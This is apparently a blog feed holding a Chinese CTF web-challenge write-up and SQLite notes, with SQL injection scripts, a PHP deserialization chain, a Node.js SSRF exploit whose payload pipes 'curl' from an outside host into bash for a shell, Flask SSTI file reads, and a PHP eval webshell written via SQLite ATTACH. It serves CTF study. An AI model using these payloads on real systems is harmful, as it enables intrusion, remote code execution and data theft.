        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>新春防疫的ctf公益比赛，有些题目可以在<code>buuoj</code>上面复现</strong></p><p>前两天做了发现差不多全是<code>sql注入</code>，要吐了，第三天的题还可以</p><h2 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h2><h3 id="简单的招聘"><a href="#简单的招聘" class="headerlink" title="简单的招聘"></a>简单的招聘</h3><p>在注册 登录那里有<code>insert into</code> 注入，<br>注入结果可以在 <code>pages-profile.php</code>看到</p><p><strong>注册页面</strong></p><pre><code>regname=a','1','1')#&amp;regpass=1</code></pre><p>发现成功注册，但是登录失败，盲猜密码经过了md5 加密</p><p>regname=a’,’1’,’1’),(‘12’,’c4ca4238a0b923820dcc509a6f75849b’,(select group_concat(column_name) from information_schema.columns where table_name=’flag’))#&amp;regpass=admin%27%7C%7C%271</p><p>获取列名</p><p>获取flag</p><p>regname=a’,’1’,’1’),(‘12’,’c4ca4238a0b923820dcc509a6f75849b’,(select flaaag from flag))#&amp;regpass=admin%27%7C%7C%271</p><p>数据库情况:</p><pre><code>表名：backup,flag,userflag:id,flaaag</code></pre><h3 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h3><p>送分题</p><p>后缀<code>php3</code><br>上传成功在  执行 <code>/readflag</code>获得<code>flag</code></p><h3 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h3><p>时间盲注，select 没了，提示<code>flag</code>在<code>fl4g</code>中</p><p>用 regexp注入</p><pre><code>import requestsimport timeimport stringurl='http://232047a84d5f4d3684012ab422bff8ae488f8539fdda475c.changame.ichunqiu.com/'def inj(payload):    t1=time.time()    req=requests.get(url,params={'id':payload})    t2=time.time()    print(t2-t1)    if t2-t1&gt;2:        return Trueflag='^'payload='0||if((fl4g regexp "{}"),sleep(2),1)'inj(payload)stri='-qwertyuiopasdfghjklzxcvbnm1234567890{}_='for i in range(50):    for j in stri:        tmp=payload.format(flag+j)        print(tmp)        a=inj(tmp)        if a is True:            flag+=j            print(flag)            break</code></pre><h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><p>这题有点意思</p><ul><li>代码审计</li><li>反序列化字符串逃逸</li><li>pop链</li></ul><p><strong>CtrlCase 可以用反序列化逃逸控制</strong></p><p>然后就可以构造pop链</p><p>然后需要找 <code>__destruct</code> 的方法 利用下去</p><ul><li><p>开始想 用反序列化 update 改admin的密码，但是失败了(本地成功。。</p></li><li><p>inseRt iNto 插入用户名也失败了(本地成功。。</p></li><li><p>后来 select 1,md5(1) from user where username=?</p></li></ul><p>看到有回显 1 ，那就注入密码</p><p><strong>pop 链:</strong></p><pre><code>&lt;?phpclass User{    public $id;    public $age = null;    public $nickname = null;}class Info{    public $age;    public $nickname;    public $CtrlCase;}Class UpdateHelper{    public $id;    public $newinfo;    public $sql;}class dbCtrl{    public $hostname="127.0.0.1";    public $dbuser="noob123";    public $dbpass="noob123";    public $database="noob123";    public $name='c4ca4238a0b923820dcc509a6f75849b';    public $password="1";    public $mysqli;    public $token='admin';}$a=new Info();$b=new UpdateHelper();$c=new User();$d=new Info();$e=new dbCtrl();$d-&gt;CtrlCase=$e;$c-&gt;nickname=$d;#$c-&gt;age='update user SET password=? where 1';$c-&gt;age='select password,md5(1) from user where username=? oR 1';#$c-&gt;age='insErt iNto user (username,password,age,nickname) valueS ("m0on",?,"1","1")';$b-&gt;sql=$c;$a-&gt;CtrlCase=$b;$a-&gt;nickname="1";$las=serialize($a);echo $las."\n";echo strlen($las);</code></pre><p>从 <code>";s:8:"CtrlCase</code> 开始截取</p><p>然后需要反序列化逃逸 ，使用 *和union 来变成hacker逃逸</p><p>用 <code>python</code> 简单处理一下</p><pre><code>a='''";s:8:"CtrlCase";O:12:"UpdateHelper":3:{s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3:{s:2:"id";N;s:3:"age";s:54:"select password,md5(1) from user where username=? oR 1";s:8:"nickname";O:4:"Info":3:{s:3:"age";N;s:8:"nickname";N;s:8:"CtrlCase";O:6:"dbCtrl":8:{s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:7:"noob123";s:6:"dbpass";s:7:"noob123";s:8:"database";s:7:"noob123";s:4:"name";s:32:"c4ca4238a0b923820dcc509a6f75849b";s:8:"password";s:1:"1";s:6:"mysqli";N;s:5:"token";s:5:"admin";}}}}}'''b=len(a)c=b//5d=''d+='*'*c+(b-c*5)*'union'+aprint(d)</code></pre><p>构造</p><pre><code>age=1&amp;nickname=***************************************************************************************************";s:8:"CtrlCase";O:12:"UpdateHelper":3:{s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3:{s:2:"id";N;s:3:"age";s:54:"select password,md5(1) from user where username=? oR 1";s:8:"nickname";O:4:"Info":3:{s:3:"age";N;s:8:"nickname";N;s:8:"CtrlCase";O:6:"dbCtrl":8:{s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:7:"noob123";s:6:"dbpass";s:7:"noob123";s:8:"database";s:7:"noob123";s:4:"name";s:32:"c4ca4238a0b923820dcc509a6f75849b";s:8:"password";s:1:"1";s:6:"mysqli";N;s:5:"token";s:5:"admin";}}}}}</code></pre><p>md5解密 是yingyingying ，看来应该可以弱口令的吧，没有试。。。。醉了</p><p>然后登录在 update.php得到flag</p><h2 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h2><h3 id="black-list"><a href="#black-list" class="headerlink" title="black_list"></a>black_list</h3><p>叠堆注入 ， set 不能用 ，那就 用handler </p><p>?inject=2%27-1;show%20tables;handler%20FlagHere%20open%20ad;handler%20ad%20read%20first;</p><pre><code>http://40509bd15cd7405893c4b46c93a1efe7772e15de2f3542b3.changame.ichunqiu.com/?inject=2%27-1;show%20tables;handler%20FlagHere%20open%20ad;handler%20ad%20read%20first;</code></pre><h3 id="easysqli-copy"><a href="#easysqli-copy" class="headerlink" title="easysqli_copy"></a>easysqli_copy</h3><p>pdo 预处理 使用了 <code>gbk</code>编码，导致宽字节注入，</p><p>叠堆 注入 ，</p><p><code>select</code> 不能用 ，用<code>set</code> 来注入</p><p>,然后时间盲注</p><pre><code>import requestsimport timeimport binasciiurl='http://a265f2d3937e403b89a0563c2dd9e88f7de2577c581345ab.changame.ichunqiu.com/?id='def requ(payload):    tmp='1%dd%27;set%20@a=0x{};prepare%20haha%20from%20@a;execute%20haha;'.format(hexpay(payload))    t1=time.time()    req=requests.get(url+tmp)    t2=time.time()    if t2-t1&gt;2:        return Truedef hexpay(payload):    pay=binascii.b2a_hex(payload.encode()).decode()    return paydb='^'for i in range(1,100):    #for j in range(40,130):    for j in '1234567890abcdefABCDEFz':        print(j)        #payload='''select if(ascii(substr(database(),{},1))={},sleep(2),1)'''.format(str(i),str(j))        #payload='''select if(ascii(substr(( select group_concat(table_name) from information_schema.tables where table_schema='pdotest'  ),{},1))={},sleep(2),1)'''.format(str(i),str(j))        #payload='''select if((select hex(group_concat(column_name)) regexp '{}' from information_schema.columns where table_name='table1' ),sleep(2),1)'''.format(db+j)        payload='''select if((select hex(fllllll4g) regexp '{}' from table1 ),sleep(2),1)'''.format(db+j)        #print(payload)        a=requ(payload)        if a is True:            db+=j            print(db)            break        if j=='z':            print('false********8')</code></pre><h3 id="ezsqli"><a href="#ezsqli" class="headerlink" title="ezsqli"></a>ezsqli</h3><p>先是获得 表名 ，</p><p>or 不能用了 ，</p><p>绕过<code>information_schema</code> </p><p><code>innodb</code> 也不能用了</p><p>用<code>sys.schema_table_statistics_with_buffer</code></p><p>然后 列名 无法得到，</p><p>union select 又不能用，版本<code>5.7</code></p><p>那就看官方文档 ，</p><p>看到了 </p><p><a href="https://dev.mysql.com/doc/refman/5.7/en/row-subqueries.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/row-subqueries.html</a></p><p>(column1,column2) = (1,1);</p><p>可以用类似盲注方法 </p><p>(column1,column2) &gt;= (1,1);</p><p>发现 两列的 所以 </p><p><code>where  (1,1)&gt;= (select * from f1ag_1s_h3r3_hhhhh)</code></p><p>，试过几个发现 ， </p><p> <code>where  (1,'a')&gt;= (select * from f1ag_1s_h3r3_hhhhh)</code><br>这样会出错，返回500 ，</p><p>而 第一列 测试发现int型的，</p><p>所以第二列是flag</p><p>所以用 <code>(select 0x61)</code>这样的代表第二列</p><pre><code>import requestsimport timeimport binasciiurl='http://e1feb1a7ba234a06a1669d7949ac16b7c16cbab87af44d76.changame.ichunqiu.com/index.php'def inj(payload):    req=requests.post(url,data={'id':payload})    if 'Hello CQGAME' in req.text:        return Truedb=''for i in range(50):    for j in range(30,130):        #payload='''2-(select hex( ( select database() )) regexp '{}'  )'''.format(db+j)        #payload='''2-(select hex( ( select group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database() )) regexp '{}'  )'''.format(db+j)        payload='''3-(select 1   where ((select 1),(select {} ))&gt;= (select * from f1ag_1s_h3r3_hhhhh))'''.format('0x'+binascii.b2a_hex(db.encode()).decode()+hex(j).replace('0x',''))        print(payload)        a=inj(payload)        if  a is True:            db+=chr(j-1)            print(db)            break        if j==129:            print('false **********8')</code></pre><p>得到：</p><p>FLAG{2612D538-3A53-4B94-9079-567F7B6EB427|</p><p>只要把 最后一个 | 换成 }</p><p>再全部变成小写就可以了</p><h2 id="第三天"><a href="#第三天" class="headerlink" title="第三天"></a>第三天</h2><h3 id="node-game"><a href="#node-game" class="headerlink" title="node_game"></a>node_game</h3><p><strong>源代码：</strong></p><pre><code>var express = require('express');var app = express();var fs = require('fs');var path = require('path');var http = require('http');var pug = require('pug');var morgan = require('morgan');const multer = require('multer');app.use(multer({dest: './dist'}).array('file'));app.use(morgan('short'));app.use("/uploads",express.static(path.join(__dirname, '/uploads')))app.use("/template",express.static(path.join(__dirname, '/template')))app.get('/', function(req, res) {    var action = req.query.action?req.query.action:"index";    if( action.includes("/") || action.includes("\\") ){        res.send("Errrrr, You have been Blocked");    }    file = path.join(__dirname + '/template/'+ action +'.pug');    var html = pug.renderFile(file);    res.send(html);});app.post('/file_upload', function(req, res){    var ip = req.connection.remoteAddress;    var obj = {        msg: '',    }    if (!ip.includes('127.0.0.1')) {        obj.msg="only admin's ip can use it"        res.send(JSON.stringify(obj));        return     }    fs.readFile(req.files[0].path, function(err, data){        if(err){            obj.msg = 'upload failed';            res.send(JSON.stringify(obj));        }else{            var file_path = '/uploads/' + req.files[0].mimetype +"/";            var file_name = req.files[0].originalname            var dir_file = __dirname + file_path + file_name            if(!fs.existsSync(__dirname + file_path)){                try {                    fs.mkdirSync(__dirname + file_path)                } catch (error) {                    obj.msg = "file type error";                    res.send(JSON.stringify(obj));                    return                }            }            try {                fs.writeFileSync(dir_file,data)                obj = {                    msg: 'upload success',                    filename: file_path + file_name                }             } catch (error) {                obj.msg = 'upload failed';            }            res.send(JSON.stringify(obj));            }    })})app.get('/source', function(req, res) {    res.sendFile(path.join(__dirname + '/template/source.txt'));});app.get('/core', function(req, res) {    var q = req.query.q;    var resp = "";    if (q) {        var url = 'http://localhost:8081/source?' + q        console.log(url)        var trigger = blacklist(url);        if (trigger === true) {            res.send("error occurs!            ");                    } else {                        try {                            http.get(url, function(resp) {                                resp.setEncoding('utf8');                                resp.on('error', function(err) {                                if (err.code === "ECONNRESET") {                                 console.log("Timeout occurs");                                 return;                                }                               });                                resp.on('data', function(chunk) {                                    try {                                     resps = chunk.toString();                                     res.send(resps);                                    }catch (e) {                                       res.send(e.message);                                    }                                }).on('error', (e) =&gt; {                                     res.send(e.message);});                            });                        } catch (error) {                            console.log(error);                        }                    }                } else {                    res.send("search param 'q' missing!");                }            })            function blacklist(url) {                var evilwords = ["global", "process","mainModule","require","root","child_process","exec","\"","'","!"];                var arrayLen = evilwords.length;                for (var i = 0; i &lt; arrayLen; i++) {                    const trigger = url.includes(evilwords[i]);                    if (trigger === true) {                        return true                    }                }            }            var server = app.listen(8081, function() {                var host = server.address().address                var port = server.address().port                console.log("Example app listening at http://%s:%s", host, port)            })</code></pre><p>思路很清晰<br>/file_upload 有一个限制必须 127.0.0.1<br>先 利用node 的cve ，拆分攻击，http.get() 可以 用 unicode 字符，来CRLF和SSRF</p><p>利用SSRF上传个 文件 ，然后用pug 执行命令 </p><p>可惜一直 被 content-length 坑了 ，这个如果不精确 就会让 服务器 堵塞 30秒，到最后只剩下30分钟才发现这个问题。 难怪一直 失败， 比赛结束之后做出来了，</p><p>poc:弹shell</p><pre><code>import urllibimport requestspayload='''dasdas HTTP/1.1Host:127.0.0.1:8081connection:keep-alivePOST /file_upload HTTP/1.1Host: 123.57.212.112:33323User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://123.57.212.112:33323/?action=uploadContent-Type: multipart/form-data; boundary=---------------------------7583695899588870231116957455Content-Length: 404Connection: closeUpgrade-Insecure-Requests: 1-----------------------------7583695899588870231116957455Content-Disposition: form-data; name="file"; filename="ggg.pug"Content-Type: ../../../../../usr/src/app/uploads/-[]["constructor"]["constructor"]("console.log(this.process.mainModule.require('child_process').exec('curl http://mu2766c382.zicp.vip:18430/shell | /bin/bash'))")()-----------------------------7583695899588870231116957455--GET / HTTP/1.1connection:close'''.replace("\r\n","\n")payload=payload.replace("\n","\r\n")print(payload)payload=payload.replace("\r",'\u010D').replace("\n",'\u010a').replace(' ','\u0120').replace('"','\u0122').replace("'",'\u0127').replace('-','\u012d').replace('=','\u013d').replace('/','\u012f')payload=payload.replace('o','\u016f').replace('e','\u0165').replace('|','\u017c').replace('a','\u0161')url='http://182.92.243.154:33322/core?q='req=requests.get(url+urllib.parse.quote(payload))print(req.text)</code></pre><p>这些blacklist 都可以使用 </p><p><code>replace('o','\u016f')</code></p><p><code>replace('e','\u0165')</code> 绕过</p><p>action 那里可以使用 数组绕过 <code>/</code>和 <code>\</code></p><p>然后访问 </p><pre><code>http://182.92.243.154:33322/?action[]=../../../../../../usr/src/app/uploads/ggg</code></pre><p>执行命令 </p><p>cd /</p><p>cat /flag,txt</p><h3 id="flaskapp"><a href="#flaskapp" class="headerlink" title="flaskapp"></a>flaskapp</h3><p>python3.7</p><p>利用 SSTI 读取文件</p><p>然后 debug pin 执行命令</p><p>在 base64 decode 那里 存在SSTI，这个SSTI 执行命令的被禁了，</p><p>读取文件可以使用 </p><p><code>&lt;class 'urllib.request.URLopener'&gt;</code></p><p>这个类</p><p>使用 base64编码的 </p><pre><code>{{session['__class__'].__mro__[11].__subclasses__()}}</code></pre><p>获取 </p><pre><code>csrf_token=ImQ2ZDgzM2Q0NWYzYThjYjVmZWY2NTU3NjNhYzgxNTRhNTNjNTg1ZmUi.XlNFsg.YPgw6WxuZ6-ZC8z0v129Lf1h42g&amp;text=e3tzZXNzaW9uWydfX2NsYXNzX18nXS5fX21yb19fWzExXS5fX3N1YmNsYXNzZXNfXygpfX0= &amp;submit=%E6%8F%90%E4%BA%A4</code></pre><p>然后 读取 pin 需要的文件</p><pre><code>{{session['__class__'].__mro__[11].__subclasses__()[367]().open_file('/sys/class/net/eth0/address').read()}}</code></pre><p>base64 编码</p><p>再读取 <code>/proc/self/cgroup</code> 获取 <code>machine-id</code></p><p>读取 <code>/etc/passwd</code>获取 用户名 <code>flaskweb</code></p><p>脚本:<br><code>machine-id</code> <code>用户名</code>，<code>/sys/class/net/eth0/address</code>要自己获取</p><pre><code>import hashlibfrom itertools import chainprobably_public_bits = [    'flaskweb'# username    'flask.app',# modname    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))    '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),]private_bits = [    '2485377957892',# str(uuid.getnode()),  /sys/class/net/eth0/address    '2760c403a7342785875fee2cf06c775c5d54803fe8436f19ce7b9e83281015c2'# get_machine_id(), /etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits):    if not bit:        continue    if isinstance(bit, str):        bit = bit.encode('utf-8')    h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None:    h.update(b'pinsalt')    num = ('%09d' % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None:    for group_size in 5, 4, 3:        if len(num) % group_size == 0:            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')                          for x in range(0, len(num), group_size))            break    else:        rv = numprint(rv)</code></pre><h3 id="easythink"><a href="#easythink" class="headerlink" title="easythink"></a>easythink</h3><p>thinkphp6.0的漏洞</p><p>thinkphp6.0 写入shell</p><p>session 如果是 32位 的话， 没有任何过滤就写入 session 文件，thinkphp6的session文件 默认在 <code>runtime</code> 目录下 ，所以 </p><p>构造 32 位 的session 最后四个 是 .php  ，</p><p>然后 就可以写入shell了，</p><p>至于shell的值 要用 $_SESSION[‘’] 这个来构造，很简单</p><p>随便一个用户名 ，用构造的session 登录 ，</p><p>然后 到<code>search</code>页面</p><p>要 <code>search</code> 的历史记录 会记录在session中 ，</p><p>然后就 蚁剑连接</p><p>需要执行 <code>/readflag</code>  才可以 读取flag  ，</p><p>但是有disable_function</p><p>就使用 php-gc 绕过disable_function ，</p><p>平时使用的 exp不行，多找几个类型的 ， 找另外一个 就成功了</p><h3 id="ezexpress"><a href="#ezexpress" class="headerlink" title="ezexpress"></a>ezexpress</h3><ul><li>admin  toLowerCase() 绕过</li><li>原型链污染</li></ul><p>merge() 函数可以原型链污染 opts 对象 outputFunctionName</p><p>做到一半 ，发现 可以上车 ，直接获取flag ，醉了<br>详情看<br><a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/" target="_blank" rel="noopener">https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlite</title>
      <link href="/2020/02/14/sqlite/"/>
      <url>/2020/02/14/sqlite/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="sqlite基础"><a href="#sqlite基础" class="headerlink" title="sqlite基础"></a>sqlite基础</h2><p><em>sqlite没有if和sleep语句</em></p><h3 id="sqlite的-是拼接字符串"><a href="#sqlite的-是拼接字符串" class="headerlink" title="sqlite的||是拼接字符串"></a>sqlite的||是拼接字符串</h3><pre class=" language-aidl"><code class="language-aidl">sqlite> select 123||4;1234    </code></pre><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>–空格</p><p>/* */</p><h3 id="常规"><a href="#常规" class="headerlink" title="常规"></a>常规</h3><p><code>select column1 from table where 1=1 and 2=2</code></p><h3 id="sqlite数据类型"><a href="#sqlite数据类型" class="headerlink" title="sqlite数据类型"></a>sqlite数据类型</h3><ul><li>null</li><li>integer</li><li>real 浮点数</li><li>text 文本字符串 (utf-8,utf-16be或utf-16le 存储)</li><li>BLOB blob根据输入存储</li></ul><h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><h4 id="创建数据库-sqlite3-test-db"><a href="#创建数据库-sqlite3-test-db" class="headerlink" title="创建数据库: $sqlite3 test.db"></a>创建数据库: <code>$sqlite3 test.db</code></h4><p>会在当前目录创建 test.db</p><pre><code>sqlite&gt; .databases #检查是否在数据库列表main: /root/download/test.db</code></pre><h4 id="ATTACH附加数据库，如果没有则会创建"><a href="#ATTACH附加数据库，如果没有则会创建" class="headerlink" title="ATTACH附加数据库，如果没有则会创建"></a>ATTACH附加数据库，如果没有则会创建</h4><ul><li>可以利用这个来写shell<pre class=" language-aidl"><code class="language-aidl">sqlite> ATTACH DATABASE '/root/download/shell.db' as 'haah';sqlite> .databasemain: /root/download/test.dbhaah: /root/download/shell.db</code></pre></li></ul><h3 id="导出数据"><a href="#导出数据" class="headerlink" title="导出数据"></a>导出数据</h3><pre class=" language-aidl"><code class="language-aidl">sqlite> .dump #显示PRAGMA foreign_keys=OFF;BEGIN TRANSACTION;COMMIT;</code></pre><pre class=" language-aidl"><code class="language-aidl">$sqlite3 testdb.db .dump >123.sql #导出到文件中 </code></pre><h3 id="表"><a href="#表" class="headerlink" title="表"></a>表</h3><h4 id="table"><a href="#table" class="headerlink" title=".table"></a>.table</h4><p>查看表</p><h4 id="insert，select，update和mysql类似"><a href="#insert，select，update和mysql类似" class="headerlink" title="insert，select，update和mysql类似"></a>insert，select，update和mysql类似</h4><h4 id="create-table"><a href="#create-table" class="headerlink" title="create table"></a>create table</h4><pre class=" language-aidl"><code class="language-aidl">CREATE TABLE `vote` (  `id` INTEGER PRIMARY KEY AUTOINCREMENT,  `name` TEXT NOT NULL,  `count` INTEGER);</code></pre><h4 id="insert-table"><a href="#insert-table" class="headerlink" title="insert table"></a>insert table</h4><pre class=" language-aidl"><code class="language-aidl">INSERT INTO `vote` (`name`, `count`) VALUES  ('dog', 0),  ('cat', 0),  ('zebra', 0),  ('koala', 0);</code></pre><h3 id="GLOB-类似like"><a href="#GLOB-类似like" class="headerlink" title="GLOB  类似like"></a>GLOB  类似like</h3><p>GLOB对大小写敏感，而且使用linux的符号 </p><ul><li>*</li></ul><ul><li>?</li></ul><pre><code>sqlite&gt; select * from vote where name GLOB 'do?';id          name        count     ----------  ----------  ----------1           dog         0</code></pre><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="abs"><a href="#abs" class="headerlink" title="abs()"></a>abs()</h4><p>如果整数是<code>-9223372036854775808</code>会溢出错误</p><h4 id="coalesce-可以多个参数，返回第一个不是null的参数"><a href="#coalesce-可以多个参数，返回第一个不是null的参数" class="headerlink" title="coalesce()可以多个参数，返回第一个不是null的参数"></a>coalesce()可以多个参数，返回第一个不是null的参数</h4><pre class=" language-cookie"><code class="language-cookie">select coalesce(null,'a','abbbb');coalesce(null,'a','a')----------------------a         </code></pre><pre class=" language-cookie"><code class="language-cookie">select coalesce(nullif(2,2),'hah');coalesce(nullif(2,2),'hah')---------------------------hah              </code></pre><p>相当于 if 2=2 return hah else null</p><h4 id="hex-char"><a href="#hex-char" class="headerlink" title="hex,char"></a>hex,char</h4><h4 id="nullif-和-ifnull"><a href="#nullif-和-ifnull" class="headerlink" title="nullif 和 ifnull"></a>nullif 和 ifnull</h4><ul><li>nullif</li></ul><p>两个参数，nullif(a,b),如果a和b相等返回 null</p><p>如果a和b不想等，返回 a</p><ul><li>ifnull </li></ul><p>和 <code>coalesce()</code>类似，不过只能两个参数，返回第一个非null</p><p>如果都为null，返回null</p><h4 id="instr-a-b"><a href="#instr-a-b" class="headerlink" title="instr(a,b)"></a>instr(a,b)</h4><p>返回<code>b</code>在<code>a</code>出现的位置</p><h4 id="length"><a href="#length" class="headerlink" title="length()"></a>length()</h4><h4 id="lower和-upper"><a href="#lower和-upper" class="headerlink" title="lower和 upper"></a>lower和 upper</h4><h4 id="max-a-b"><a href="#max-a-b" class="headerlink" title="max(a,b)"></a>max(a,b)</h4><h4 id="like-a-b"><a href="#like-a-b" class="headerlink" title="like(a,b)"></a>like(a,b)</h4><p>相当于 <code>b</code> like <code>a</code></p><p>可以用 _ % </p><pre><code>sqlite&gt; select like('ab_','abc');like('ab_','abc')-----------------1          </code></pre><ul><li>like可以有第三个参数，</li></ul><p>相当于like语句的 ESCAPE ，转义</p><p>在 <code>%</code> 或者 <code>_</code> 前面添加什么字符可以把 <code>%</code>或者 <code>_</code>当作字符串</p><p>而不是匹配符号 </p><pre class=" language-cookie"><code class="language-cookie">sqlite> select like('barz_','bar_','z');like('barz_','bar_','z')------------------------1             </code></pre><p>这里把 z 用作 和 \ 类似的作用</p><h4 id="ltrim-a-和-ltrim-a-b"><a href="#ltrim-a-和-ltrim-a-b" class="headerlink" title="ltrim(a) 和 ltrim(a,b)"></a>ltrim(a) 和 ltrim(a,b)</h4><p>删除左侧字符串</p><ul><li>一个参数 返回删除左侧空格的字符串</li><li>两个参数 a,b ，返回删除空格和第二个参数<code>b</code>字符串<pre class=" language-cookie"><code class="language-cookie">sqlite> SELECT ltrim('aaaa bc','a');ltrim('aaaa bc','a')bc</code></pre></li></ul><h4 id="rtrim-a-和-rtrim-a-b-和ltrim类似"><a href="#rtrim-a-和-rtrim-a-b-和ltrim类似" class="headerlink" title="rtrim(a)和 rtrim(a,b) 和ltrim类似"></a>rtrim(a)和 rtrim(a,b) 和ltrim类似</h4><h4 id="trim-就是-rtrim-ltrim"><a href="#trim-就是-rtrim-ltrim" class="headerlink" title="trim 就是 rtrim + ltrim"></a>trim 就是 rtrim + ltrim</h4><h4 id="printf"><a href="#printf" class="headerlink" title="printf()"></a>printf()</h4><p>和普通的 格式化字符串一样 ，</p><pre class=" language-cookie"><code class="language-cookie">sqlite> select printf("aw%s",'sl');printf("aw%s",'sl')awsl</code></pre><h4 id="quote-a"><a href="#quote-a" class="headerlink" title="quote(a)"></a>quote(a)</h4><p>将字符串 带上 ‘ ‘ </p><pre class=" language-cookie"><code class="language-cookie">平常：sqlite> select 1233;1233      ----------1233      quote:sqlite> SELECT quote('1233');quote('1233')-------------'1233'    </code></pre><h4 id="random"><a href="#random" class="headerlink" title="random()"></a>random()</h4><p>返回随机数</p><h4 id="randomblob-a"><a href="#randomblob-a" class="headerlink" title="randomblob(a)"></a>randomblob(a)</h4><p>返回 a个字节的 blob</p><p>如果很长可以造成时间盲注</p><h4 id="replace-a-b-c"><a href="#replace-a-b-c" class="headerlink" title="replace(a,b,c)"></a>replace(a,b,c)</h4><p>把 a中的 b换成c</p><pre class=" language-cookie"><code class="language-cookie">sqlite> select replace('a{ab}','a','b');replace('a{ab}','a','b')------------------------b{bb}            </code></pre><h4 id="soundex"><a href="#soundex" class="headerlink" title="soundex()"></a>soundex()</h4><p>返回字符串的 <code>soundex</code>编码 ，很迷</p><p>开眼界了</p><pre class=" language-cookie"><code class="language-cookie">sqlite> select soundex('a');soundex('a')------------A000       </code></pre><h4 id="sqlite-version-版本"><a href="#sqlite-version-版本" class="headerlink" title="sqlite_version() 版本"></a>sqlite_version() 版本</h4><h4 id="substr-和mysql"><a href="#substr-和mysql" class="headerlink" title="substr() 和mysql"></a>substr() 和mysql</h4><h4 id="typeof"><a href="#typeof" class="headerlink" title="typeof"></a>typeof</h4><p>返回字符串类型</p><h4 id="unicode"><a href="#unicode" class="headerlink" title="unicode()"></a>unicode()</h4><p>返回第一个字符的<code>unicode</code> 数字</p><pre class=" language-cookie"><code class="language-cookie">sqlite> select unicode('a');unicode('a')------------97         sqlite> select unicode('哈');unicode('哈')------------21704     </code></pre><h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><h3 id="写shell-需要叠堆注入"><a href="#写shell-需要叠堆注入" class="headerlink" title="写shell 需要叠堆注入"></a>写shell 需要叠堆注入</h3><pre class=" language-aidl"><code class="language-aidl">ATTACH DATABASE '/tmp/good.php' as 'm0on';CREATE TABLE m0on.shell_haha(`haha` text);INSERT INTO m0on.shell_haha (haha) VALUES ('<?php eval($_POST[cmd]);?>');</code></pre><p>cat /tmp/good.php</p><pre><code>��A&lt;?php eval($_POST[cmd]);?&gt;</code></pre><h3 id="获取所有表名"><a href="#获取所有表名" class="headerlink" title="获取所有表名"></a>获取所有表名</h3><pre class=" language-cookie"><code class="language-cookie">select name from sqlite_master where type='table';select tbl_name from sqlite_master where type='table';</code></pre><h3 id="获取-表的结构，包括列名"><a href="#获取-表的结构，包括列名" class="headerlink" title="获取 表的结构，包括列名"></a>获取 表的结构，包括列名</h3><pre class=" language-cookie"><code class="language-cookie">select sql from sqlite_master where name='表名';sqlite> select sql from sqlite_master where name='shell';sql                             --------------------------------CREATE TABLE shell(first,second)列名是 first 和 second</code></pre><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="substr-unicode"><a href="#substr-unicode" class="headerlink" title="substr ,unicode"></a>substr ,unicode</h4><pre class=" language-cookie"><code class="language-cookie">select unicode(substr('abc',1,1));select substr('abc',1,1);</code></pre><p>使用<code>unicode()</code> 类似于 mysql的<code>ascii()</code></p><h4 id="like"><a href="#like" class="headerlink" title="like"></a>like</h4><pre class=" language-cookie"><code class="language-cookie">select like('a%','abc');</code></pre><h4 id="regexp"><a href="#regexp" class="headerlink" title="regexp"></a>regexp</h4><p>需要扩展</p><pre class=" language-cookie"><code class="language-cookie">apt-get install sqlite3-pcre</code></pre><p>或者</p><pre class=" language-cookie"><code class="language-cookie">sqlite>  .load /usr/lib/sqlite3/pcre.so</code></pre><p>语句类似mysql不说了</p><h4 id="GLOB"><a href="#GLOB" class="headerlink" title="GLOB"></a>GLOB</h4><p>类似<code>like</code>，不过用的是unix的 * 